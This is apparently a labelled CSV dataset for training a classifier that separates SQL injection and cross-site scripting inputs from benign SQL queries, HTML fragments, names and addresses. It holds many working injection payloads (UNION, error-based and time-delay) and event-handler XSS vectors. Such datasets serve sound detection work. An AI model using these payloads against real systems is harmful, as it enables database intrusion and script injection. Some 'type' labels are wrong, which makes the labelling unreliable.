Text,Label,type
"1""  )   where 9570  =  9570 rlike   (  select   (  case when   (  1642  =  3686  )   then 1 else 0x28 end   )    )   --",1,sql
goman@fbi-criminal-network.com.mh,0,sql
"1%"" and 9198  =  9198--",1,sql
SELECT AVG ( car ) FROM breeze,0,sql
 ,0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><strong id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></strong>",2,xss
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_content' LIMIT 1,0,sql
aguacella,0,xss
SELECT * FROM sudden WHERE ourselves = 'stairs' FETCH FIRST 3 ROWS ONLY,0,sql
-5820'   )    )    as lkik where 4044  =  4044 or 7156  =  9197--,1,sql
SELECT * FROM fell WHERE engineer NOT LIKE '[basket]%',0,sql
<form id=x tabindex=1 onbeforeactivate=alert(1)></form>,2,xss
	 </span> ,0,xss
"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'zoxm' like 'zoxm",1,sql
"<rb onmousedown=""alert(1)"">test</rb>",2,xss
SELECT * FROM port FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM forgotten,0,sql
	 </span> ,0,xss
SELECT * FROM amount WHERE but = 'greater' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT AVG ( battle ) FROM shape SELECT SUM ( struggle ) ,0,sql
"<map draggable=""true"" ondragend=""alert(1)"">test</map>",2,xss
|,1,sql
"<style>:target {transform: rotate(180deg);}</style><html id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></html>",2,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'  =  'vhvh",1,sql
select * from users where id  =  1. <@ or 1  =  1 -- 1,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://www.scmp.com/tech/innovation/article/2098164/robots-are-coming-here-are-some-jobs-wont-exist-10-years"">""Will your job still exist in 10 years when the robots arrive?"" </a>. <i><a href=""/wiki/South_China_Morning_Post"" title=""South China Morning Post"">South China Morning Post </a> </i>. 2017<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",0,xss
" SELECT * FROM putting ORDER BY thought, nice",0,sql
<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>,2,xss
SELECT package ( s )  FROM discussion UNION,0,sql
"calle las artes, 90,",0,sql
<u id=x tabindex=1 onfocusin=alert(1)></u>,2,xss
SELECT AVG ( upper ) FROM turn SELECT SUM ( pull ) ,0,xss
 or '1'  =  '1,1,sql
"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationend=""alert(1)""></dir>",2,xss
"<li><a href=""/wiki/Philosophy_of_psychiatry"" title=""Philosophy of psychiatry"">Psychiatry </a> </li>",0,xss
"<li><a href=""/wiki/Genetic_operators"" class=""mw-redirect"" title=""Genetic operators"">Genetic operators </a> </li>",0,xss
SELECT season FROM book UNION SELECT out FROM pattern ORDER BY naturally,0,sql
Turing's original publication:,0,xss
1'||  (  select 'sliy' where 9494  =  9494,1,sql
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'kmjn'  =  'kmjn",1,sql
terhune@multireform.tn,0,sql
28287163s,0,sql
"-8888%'  )   union all select 5312,5312,5312,5312,5312,5312,5312,5312--",1,sql
SELECT * FROM thee WHERE feet = 'cabin' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT colony ( s )  FROM cover SELECT molecular FROM how,0,sql
1'   )    )    as clbc where 5649  =  5649,1,sql
"1"" where 1140  =  1140 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"  SELECT wasteID AS ID, surprise AS morning FROM whole",0,sql
"1""   )    )    as fjtv where 8904  =  8904",1,sql
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",1,sql
"   SELECT range,nuts,individual,hospital,present     (  (  continent JOIN move ON beat.grass =  weak.hungry )   INNER JOIN accidentON Orders.current =  chest.trafficID ) ",0,sql
"<nav oncontextmenu=""alert(1)"">test</nav>",2,xss
SELECT * FROM railroad  WHERE pan NOT LIKE '[rays]%',0,sql
SELECT TOP 3 * FROM belong WHERE feed = 'real',0,sql
SELECT * FROM protection WHERE gold = 'involved'  AND City = 'poem',0,sql
gates,0,sql
"<h2>Getting help<a class=""headerlink"" href=""#getting-help"" title=""Permalink to this headline"">¶</a></h2>",0,xss
"INSERT INTO shade  ( fire, contrast, mouse )  VALUES  ( 'skill', 'sudden', 'dish' )  ",0,sql
"  SELECT grandfatherID AS ID, friend AS edge FROM fact",0,xss
"cuesta sagrado corazon, 155 5?a",0,sql
sureda bahamonde,0,sql
SELECT * FROM dirty WHERE whole = 'stood' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT negative ( s ) FROM bend INNER JOIN,0,sql
"<li><cite class=""citation book""><a href=""/wiki/Patrick_Winston"" title=""Patrick Winston"">Winston, Patrick Henry </a> (1984). <a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/artificialintell00wins""><i>Artificial Intelligence </i> </a>. Reading, MA: Addison-Wesley. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-201-08259-3"" title=""Special:BookSources/978-0-201-08259-3""><bdi>978-0-201-08259-3 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Artificial+Intelligence&amp;rft.place=Reading%2C+MA&amp;rft.pub=Addison-Wesley&amp;rft.date=1984&amp;rft.isbn=978-0-201-08259-3&amp;rft.aulast=Winston&amp;rft.aufirst=Patrick+Henry&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fartificialintell00wins&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<rb onpaste=""alert(1)"" contenteditable>test</rb>",2,xss
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;204–233, </li>",0,xss
1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#,1,sql
SELECT COUNT ( humanID ) FROM fed,0,sql
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'ugoz'  =  'ugoz,1,sql
"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",1,sql
1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,1,sql
<isindex onpointerleave=alert(1)>XSS</isindex>,2,xss
" select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",1,sql
"-2284%""   )    )    or 9323  =  9323#",1,sql
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",1,sql
"1""  )   where 6843  =  6843 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,xss
"-6249'   )    )     )   union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",1,sql
SELECT smaller FROM please UNION ALL SELECT weather FROM pattern ORDER BY course,0,sql
"puerta del sol 124, 8?h",0,sql
SELECT * FROM body WHERE completely BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",2,xss
SELECT * FROM memory,0,sql
SELECT window,0,sql
"<style onkeypress=""alert(1)"" contenteditable>test</style>",2,xss
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'hofy' like 'hofy",1,sql
"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",1,xss
<html onpointerenter=alert(1)>XSS</html>,2,xss
"royo, el",0,sql
SELECT * FROM  ( SELECT meal FROM sat ) ,0,sql
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",1,sql
clever,0,xss
persson_mcclanahan@deseoun.km,0,sql
SELECT COUNT ( especiallyID ) FROM mud,0,sql
1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  ',1,sql
"1%'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  '%'  =  '",1,sql
<menuitem id=x tabindex=1 onfocus=alert(1)></menuitem>,2,xss
"<link rel=""dns-prefetch"" href=""//meta.wikimedia.org"" />",0,xss
<svg><col onload=alert(1)></col>,2,xss
"1'+  (  select 'vwzp' where 2729  =  2729 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
7.81237E+15,0,sql
"1%'  )   union all select null,null,null,null,null,null,null,null--",1,sql
1'   )    )    order by 1#,1,sql
AI in myth:,0,xss
evarist arnus 5 11-d,0,sql
<var onpointerleave=alert(1)>XSS</var>,2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
SELECT * FROM angry FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM spoken,0,sql
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",1,sql
SELECT AVG ( mysterious ) FROM bush SELECT SUM ( adult ) ,0,xss
SELECT * FROM whale WHERE idea BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1'  )   union all select null,null,null,null,null#",1,sql
"<li><a href=""/wiki/Intelligence"" title=""Intelligence"">Intelligence </a> </li>",0,xss
"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>",2,xss
18120,0,sql
                latest,0,xss
<script onpointerleave=alert(1)>XSS</script>,2,xss
"1""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""gxqq""  =  ""gxqq",1,sql
"<meta name=""referrer"" content=""origin-when-cross-origin""/>",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><base id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></base>",2,xss
select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,1,sql
<sub onpointerdown=alert(1)>XSS</sub>,2,xss
"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",1,sql
padoan@directoriogratuito.et,0,sql
	 </span>,0,xss
	 </span>,0,xss
SELECT baby ( s )  FROM floating LEFT JOIN,0,sql
burbidge@elalamorestaurante.pr,0,sql
"<font onbeforecut=""alert(1)"" contenteditable>test</font>",2,xss
1'||  (  select 'dezl' where 8661  =  8661,1,sql
"<caption draggable=""true"" ondragstart=""alert(1)"">test</caption>",2,xss
garabatos,0,sql
 </li>,0,xss
SELECT leaf FROM atmosphere UNION ALL SELECT bring FROM grass ORDER BY spend,0,xss
SELECT * FROM escape 3 SELECT * FROM letter,0,sql
"1%""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""%""  =  """,1,sql
<section id=x tabindex=1 onfocus=alert(1)></section>,2,xss
SELECT TOP 50 PERCENT * FROM shut SELECT * FROM general FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM three,0,sql
SELECT TOP 3 * FROM result,0,sql
" SELECT * FROM took ORDER BY everything ASC, dinner DESC",0,sql
ulldemol bujeque,0,sql
	 </span></a></dt><dd>Convenient classes to extract links to follow from pages.</dd>,0,xss
